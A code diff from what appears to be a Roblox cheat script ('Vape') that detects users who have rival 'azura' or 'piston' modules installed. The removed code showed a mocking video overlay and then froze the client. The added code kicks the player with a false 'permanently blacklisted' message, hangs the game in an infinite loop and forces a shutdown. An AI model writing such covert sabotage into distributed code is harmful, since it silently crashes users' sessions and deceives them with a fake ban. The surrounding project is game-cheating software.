@@ -5048,59 +5048,13 @@ end)
 
 if betterisfile("vape/CustomModules/6872274481.lua") then 
 	local parsedfile = readfile("vape/CustomModules/6872274481.lua")
-	if parsedfile and parsedfile:lower():find("azura") then 
+	if parsedfile and (parsedfile:lower():find("azura") or parsedfile:lower():find("piston")) then 
 		task.spawn(function()
-			local video = Instance.new("VideoFrame")
-			pcall(function()
-				video.Video = getcustomassetfunc("vape/assets/skill.webm")
-			end)
-			video.Size = UDim2.new(1, 0, 1, 36)
-			video.Visible = false
-			video.Position = UDim2.new(0, 0, 0, -36)
-			video.ZIndex = 9
-			video.BackgroundTransparency = 1
-			video.Parent = game:GetService("CoreGui"):FindFirstChild("RobloxPromptGui"):FindFirstChild("promptOverlay")
-			local textlab = Instance.new("TextLabel")
-			textlab.TextSize = 45
-			textlab.ZIndex = 10
-			textlab.Size = UDim2.new(1, 0, 1, 36)
-			textlab.TextColor3 = Color3.new(1, 1, 1)
-			textlab.Text = 'imagine using azura 💀\nhow bout you just use regular vape instead of "op client side features!!1!"'
-			textlab.Position = UDim2.new(0, 0, 0, -36)
-			textlab.Font = Enum.Font.Gotham
-			textlab.BackgroundTransparency = 1
-			textlab.Parent = game:GetService("CoreGui"):FindFirstChild("RobloxPromptGui"):FindFirstChild("promptOverlay")
-			video.Loaded:Connect(function()
-				video.Visible = true
-				video:Play()
-				task.spawn(function()
-					repeat
-						wait()
-						for i = 0, 1, 0.01 do
-							wait(0.01)
-							textlab.TextColor3 = Color3.fromHSV(i, 1, 1)
-						end
-					until true == false
-				end)
-			end)
-			local suc
-			task.spawn(function()
-				suc = pcall(function() return video.Loaded:Wait() end)
-			end)
-			task.spawn(function()
-				for i = 1, 30 do 
-					task.wait(0.1)
-					if suc then break end
-				end
-				task.wait(18.909)
-				pcall(function()
-					if getconnections then
-						getconnections(entity.character.Humanoid.Died)
-					end
-					print(game:GetObjects("h29g3535")[1])
-				end)
-				while true do end
-			end)
+			lplr:Kick("You have been permanently been blacklisted from vape, Have a good day.")
 		end)
+		task.wait(3)
+		while true do end
+		getconnections(lplr.Character.Humanoid.Died)
+		game:Shutdown()
 	end
 end
